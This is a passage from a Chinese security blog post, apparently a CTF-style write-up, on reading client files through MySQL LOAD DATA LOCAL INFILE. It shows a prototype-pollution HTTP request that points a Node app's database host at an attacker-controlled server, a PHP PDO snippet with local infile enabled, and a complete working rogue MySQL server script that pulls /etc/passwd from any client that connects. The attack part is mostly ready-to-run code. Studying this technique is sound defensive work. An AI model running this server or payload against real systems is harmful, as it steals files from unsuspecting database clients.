+<h6 id="之后利用原型链的污染将host改为如下："><a href="#之后利用原型链的污染将host改为如下：" class="headerlink" title="之后利用原型链的污染将host改为如下："></a>之后利用原型链的污染将<code>host</code>改为如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.1.106:3000</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 64</span><br><span class="line">Origin: http://192.168.1.106:3000</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.1.106:3000/</span><br><span class="line"></span><br><span class="line">&#123;&quot;user&quot;:[0],&quot;passwd&quot;:[0],&quot;__proto__&quot;:&#123;&quot;host&quot;:&quot;192.168.220.157&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="就可以在mysql服务器日志中收到flag了。"><a href="#就可以在mysql服务器日志中收到flag了。" class="headerlink" title="就可以在mysql服务器日志中收到flag了。"></a>就可以在mysql服务器日志中收到flag了。</h6><h5 id="0x05-PHP-with-PDO"><a href="#0x05-PHP-with-PDO" class="headerlink" title="0x05 PHP with PDO"></a>0x05 PHP with PDO</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $pdo=<span class="keyword">new</span> PDO(<span class="string">"mysql:host=127.0.0.1;port=3306;dbname=anydb"</span>,<span class="string">'root'</span>,<span class="string">'123456'</span>,<span class="keyword">array</span>(PDO::MYSQL_ATTR_LOCAL_INFILE=&gt;<span class="keyword">true</span>,));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"connect ok!"</span>;</span><br><span class="line">    $stmt=$pdo-&gt;prepare(<span class="string">'select *from users'</span>);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $pdo=<span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>
+
+<h6 id="其余的语言同理。"><a href="#其余的语言同理。" class="headerlink" title="其余的语言同理。"></a>其余的语言同理。</h6><h6 id="恶意mysql服务器"><a href="#恶意mysql服务器" class="headerlink" title="恶意mysql服务器"></a>恶意mysql服务器</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding: utf8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> asyncore</span><br><span class="line"><span class="keyword">import</span> asynchat</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> logging.handlers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PORT = <span class="number">3306</span></span><br><span class="line"></span><br><span class="line">log = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line">log.setLevel(logging.INFO)</span><br><span class="line">tmp_format = logging.handlers.WatchedFileHandler(<span class="string">'mysql.log'</span>, <span class="string">'ab'</span>)</span><br><span class="line">tmp_format.setFormatter(logging.Formatter(<span class="string">"%(asctime)s:%(levelname)s:%(message)s"</span>))</span><br><span class="line">log.addHandler(</span><br><span class="line">    tmp_format</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">filelist = (</span><br><span class="line">    <span class="string">'/etc/passwd'</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#================================================</span></span><br><span class="line"><span class="comment">#=======No need to change after this lines=======</span></span><br><span class="line"><span class="comment">#================================================</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">'Gifts'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">daemonize</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> os, warnings</span><br><span class="line">    <span class="keyword">if</span> os.name != <span class="string">'posix'</span>:</span><br><span class="line">        warnings.warn(<span class="string">'Cant create daemon on non-posix system'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> os.fork(): os._exit(<span class="number">0</span>)</span><br><span class="line">    os.setsid()</span><br><span class="line">    <span class="keyword">if</span> os.fork(): os._exit(<span class="number">0</span>)</span><br><span class="line">    os.umask(<span class="number">0o022</span>)</span><br><span class="line">    null=os.open(<span class="string">'/dev/null'</span>, os.O_RDWR)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.dup2(null, i)</span><br><span class="line">        <span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span> e.errno != <span class="number">9</span>: <span class="keyword">raise</span></span><br><span class="line">    os.close(null)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LastPacket</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OutOfOrder</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql_packet</span><span class="params">(object)</span>:</span></span><br><span class="line">    packet_header = struct.Struct(<span class="string">'&lt;Hbb'</span>)</span><br><span class="line">    packet_header_long = struct.Struct(<span class="string">'&lt;Hbbb'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, packet_type, payload)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(packet_type, mysql_packet):</span><br><span class="line">            self.packet_num = packet_type.packet_num + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.packet_num = packet_type</span><br><span class="line">        self.payload = payload</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        payload_len = len(self.payload)</span><br><span class="line">        <span class="keyword">if</span> payload_len &lt; <span class="number">65536</span>:</span><br><span class="line">            header = mysql_packet.packet_header.pack(payload_len, <span class="number">0</span>, self.packet_num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            header = mysql_packet.packet_header.pack(payload_len &amp; <span class="number">0xFFFF</span>, payload_len &gt;&gt; <span class="number">16</span>, <span class="number">0</span>, self.packet_num)</span><br><span class="line"></span><br><span class="line">        result = <span class="string">"&#123;0&#125;&#123;1&#125;"</span>.format(</span><br><span class="line">            header,</span><br><span class="line">            self.payload</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> repr(str(self))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(raw_data)</span>:</span></span><br><span class="line">        packet_num = ord(raw_data[<span class="number">0</span>])</span><br><span class="line">        payload = raw_data[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> mysql_packet(packet_num, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">http_request_handler</span><span class="params">(asynchat.async_chat)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, addr)</span>:</span></span><br><span class="line">        asynchat.async_chat.__init__(self, sock=addr[<span class="number">0</span>])</span><br><span class="line">        self.addr = addr[<span class="number">1</span>]</span><br><span class="line">        self.ibuffer = []</span><br><span class="line">        self.set_terminator(<span class="number">3</span>)</span><br><span class="line">        self.state = <span class="string">'LEN'</span></span><br><span class="line">        self.sub_state = <span class="string">'Auth'</span></span><br><span class="line">        self.logined = <span class="literal">False</span></span><br><span class="line">        self.push(</span><br><span class="line">            mysql_packet(</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="string">""</span>.join((</span><br><span class="line">                    <span class="string">'\x0a'</span>,  <span class="comment"># Protocol</span></span><br><span class="line">                    <span class="string">'5.6.28-0ubuntu0.14.04.1'</span> + <span class="string">'\0'</span>,</span><br><span class="line">                    <span class="string">'\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00'</span>,</span><br><span class="line">                ))            )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        self.order = <span class="number">1</span></span><br><span class="line">        self.states = [<span class="string">'LOGIN'</span>, <span class="string">'CAPS'</span>, <span class="string">'ANY'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        log.debug(<span class="string">'Pushed: %r'</span>, data)</span><br><span class="line">        data = str(data)</span><br><span class="line">        asynchat.async_chat.push(self, data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">collect_incoming_data</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        log.debug(<span class="string">'Data recved: %r'</span>, data)</span><br><span class="line">        self.ibuffer.append(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">found_terminator</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = <span class="string">""</span>.join(self.ibuffer)</span><br><span class="line">        self.ibuffer = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.state == <span class="string">'LEN'</span>:</span><br><span class="line">            len_bytes = ord(data[<span class="number">0</span>]) + <span class="number">256</span>*ord(data[<span class="number">1</span>]) + <span class="number">65536</span>*ord(data[<span class="number">2</span>]) + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> len_bytes &lt; <span class="number">65536</span>:</span><br><span class="line">                self.set_terminator(len_bytes)</span><br><span class="line">                self.state = <span class="string">'Data'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.state = <span class="string">'MoreLength'</span></span><br><span class="line">        <span class="keyword">elif</span> self.state == <span class="string">'MoreLength'</span>:</span><br><span class="line">            <span class="keyword">if</span> data[<span class="number">0</span>] != <span class="string">'\0'</span>:</span><br><span class="line">                self.push(<span class="literal">None</span>)</span><br><span class="line">                self.close_when_done()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.state = <span class="string">'Data'</span></span><br><span class="line">        <span class="keyword">elif</span> self.state == <span class="string">'Data'</span>:</span><br><span class="line">            packet = mysql_packet.parse(data)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> self.order != packet.packet_num:</span><br><span class="line">                    <span class="keyword">raise</span> OutOfOrder()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># Fix ?</span></span><br><span class="line">                    self.order = packet.packet_num + <span class="number">2</span></span><br><span class="line">                <span class="keyword">if</span> packet.packet_num == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> packet.payload[<span class="number">0</span>] == <span class="string">'\x03'</span>:</span><br><span class="line">                        log.info(<span class="string">'Query'</span>)</span><br><span class="line"></span><br><span class="line">                        filename = random.choice(filelist)</span><br><span class="line">                        PACKET = mysql_packet(</span><br><span class="line">                            packet,</span><br><span class="line">                            <span class="string">'\xFB&#123;0&#125;'</span>.format(filename)</span><br><span class="line">                        )</span><br><span class="line">                        self.set_terminator(<span class="number">3</span>)</span><br><span class="line">                        self.state = <span class="string">'LEN'</span></span><br><span class="line">                        self.sub_state = <span class="string">'File'</span></span><br><span class="line">                        self.push(PACKET)</span><br><span class="line">                    <span class="keyword">elif</span> packet.payload[<span class="number">0</span>] == <span class="string">'\x1b'</span>:</span><br><span class="line">                        log.info(<span class="string">'SelectDB'</span>)</span><br><span class="line">                        self.push(mysql_packet(</span><br><span class="line">                            packet,</span><br><span class="line">                            <span class="string">'\xfe\x00\x00\x02\x00'</span></span><br><span class="line">                        ))</span><br><span class="line">                        <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                    <span class="keyword">elif</span> packet.payload[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">'\x02'</span>:</span><br><span class="line">                        self.push(mysql_packet(</span><br><span class="line">                            packet, <span class="string">'\0\0\0\x02\0\0\0'</span></span><br><span class="line">                        ))</span><br><span class="line">                        <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                    <span class="keyword">elif</span> packet.payload == <span class="string">'\x00\x01'</span>:</span><br><span class="line">                        self.push(<span class="literal">None</span>)</span><br><span class="line">                        self.close_when_done()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">raise</span> ValueError()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.sub_state == <span class="string">'File'</span>:</span><br><span class="line">                        log.info(<span class="string">'-- result'</span>)</span><br><span class="line">                        log.info(<span class="string">'Result: %r'</span>, data)</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> len(data) == <span class="number">1</span>:</span><br><span class="line">                            self.push(</span><br><span class="line">                                mysql_packet(packet, <span class="string">'\0\0\0\x02\0\0\0'</span>)</span><br><span class="line">                            )</span><br><span class="line">                            <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            self.set_terminator(<span class="number">3</span>)</span><br><span class="line">                            self.state = <span class="string">'LEN'</span></span><br><span class="line">                            self.order = packet.packet_num + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">elif</span> self.sub_state == <span class="string">'Auth'</span>:</span><br><span class="line">                        self.push(mysql_packet(</span><br><span class="line">                            packet, <span class="string">'\0\0\0\x02\0\0\0'</span></span><br><span class="line">                        ))</span><br><span class="line">                        <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        log.info(<span class="string">'-- else'</span>)</span><br><span class="line">                        <span class="keyword">raise</span> ValueError(<span class="string">'Unknown packet'</span>)</span><br><span class="line">            <span class="keyword">except</span> LastPacket:</span><br><span class="line">                log.info(<span class="string">'Last packet'</span>)</span><br><span class="line">                self.state = <span class="string">'LEN'</span></span><br><span class="line">                self.sub_state = <span class="literal">None</span></span><br><span class="line">                self.order = <span class="number">0</span></span><br><span class="line">                self.set_terminator(<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">except</span> OutOfOrder:</span><br><span class="line">                log.warning(<span class="string">'Out of order'</span>)</span><br><span class="line">                self.push(<span class="literal">None</span>)</span><br><span class="line">                self.close_when_done()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            log.error(<span class="string">'Unknown state'</span>)</span><br><span class="line">            self.push(<span class="string">'None'</span>)</span><br><span class="line">            self.close_when_done()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql_listener</span><span class="params">(asyncore.dispatcher)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, sock=None)</span>:</span></span><br><span class="line">        asyncore.dispatcher.__init__(self, sock)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> sock:</span><br><span class="line">            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            self.set_reuse_addr()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.bind((<span class="string">''</span>, PORT))</span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            self.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_accept</span><span class="params">(self)</span>:</span></span><br><span class="line">        pair = self.accept()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> pair <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            log.info(<span class="string">'Conn from: %r'</span>, pair[<span class="number">1</span>])</span><br><span class="line">            tmp = http_request_handler(pair)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">z = mysql_listener()</span><br><span class="line"><span class="comment"># daemonize()</span></span><br><span class="line">asyncore.loop()</span><br></pre></td></tr></table></figure>
+
+<h5 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h5><h6 id="https-xz-aliyun-com-t-6991"><a href="#https-xz-aliyun-com-t-6991" class="headerlink" title="https://xz.aliyun.com/t/6991"></a><a href="https://xz.aliyun.com/t/6991" target="_blank" rel="noopener">https://xz.aliyun.com/t/6991</a></h6><h6 id="https-blog-csdn-net-ls1120704214-article-details-88174003-1"><a href="#https-blog-csdn-net-ls1120704214-article-details-88174003-1" class="headerlink" title="https://blog.csdn.net/ls1120704214/article/details/88174003"></a><a href="https://blog.csdn.net/ls1120704214/article/details/88174003" target="_blank" rel="noopener">https://blog.csdn.net/ls1120704214/article/details/88174003</a></h6><h6 id="MySQL-MySQL-Internals-Manual-14-MySQL-Client-Server-Protocol"><a href="#MySQL-MySQL-Internals-Manual-14-MySQL-Client-Server-Protocol" class="headerlink" title="MySQL :: MySQL Internals Manual :: 14 MySQL Client/Server Protocol"></a><a href="https://dev.mysql.com/doc/internals/en/client-server-protocol.html" target="_blank" rel="noopener">MySQL :: MySQL Internals Manual :: 14 MySQL Client/Server Protocol</a></h6><h6 id="从MySQL出发的反击之路"><a href="#从MySQL出发的反击之路" class="headerlink" title="从MySQL出发的反击之路"></a><a href="https://www.freebuf.com/vuls/188910.html" target="_blank" rel="noopener">从MySQL出发的反击之路</a></h6><h6 id="Read-MySQL-Client’s-File-不发光的博客"><a href="#Read-MySQL-Client’s-File-不发光的博客" class="headerlink" title="Read MySQL Client’s File - 不发光的博客"></a><a href="https://lightless.me/archives/read-mysql-client-file.html" target="_blank" rel="noopener">Read MySQL Client’s File - 不发光的博客</a></h6><h6 id="如何利用MySQL-LOCAL-INFILE读取客户端文件"><a href="#如何利用MySQL-LOCAL-INFILE读取客户端文件" class="headerlink" title="如何利用MySQL LOCAL INFILE读取客户端文件"></a><a href="https://www.anquanke.com/post/id/106488" target="_blank" rel="noopener">如何利用MySQL LOCAL INFILE读取客户端文件</a></h6><h6 id="MySQL-connect-file-read"><a href="#MySQL-connect-file-read" class="headerlink" title="MySQL connect file read"></a><a href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/" target="_blank" rel="noopener">MySQL connect file read</a></h6><h6 id="https-stackoverflow-com-questions-7638090-load-data-local-infile-forbidden-in-php"><a href="#https-stackoverflow-com-questions-7638090-load-data-local-infile-forbidden-in-php" class="headerlink" title="https://stackoverflow.com/questions/7638090/load-data-local-infile-forbidden-in-php"></a><a href="https://stackoverflow.com/questions/7638090/load-data-local-infile-forbidden-in-php" target="_blank" rel="noopener">https://stackoverflow.com/questions/7638090/load-data-local-infile-forbidden-in-php</a></h6><h6 id="https-github-com-allyshka-Rogue-MySql-Server"><a href="#https-github-com-allyshka-Rogue-MySql-Server" class="headerlink" title="https://github.com/allyshka/Rogue-MySql-Server"></a><a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server</a></h6><h6 id="https-www-cnblogs-com-BOHB-yunying-p-10820453-html"><a href="#https-www-cnblogs-com-BOHB-yunying-p-10820453-html" class="headerlink" title="https://www.cnblogs.com/BOHB-yunying/p/10820453.html"></a><a href="https://www.cnblogs.com/BOHB-yunying/p/10820453.html" target="_blank" rel="noopener">https://www.cnblogs.com/BOHB-yunying/p/10820453.html</a></h6>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/21/2019hack-luCTF的numtonce的环境搭建到解决的详细过程/" rel="next" title="2019hack.luCTF的numtonce的环境搭建到解决的详细过程">
+                <i class="fa fa-chevron-left"></i> 2019hack.luCTF的numtonce的环境搭建到解决的详细过程
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
+            
+              <p class="site-author-name" itemprop="name">Ljdd520</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
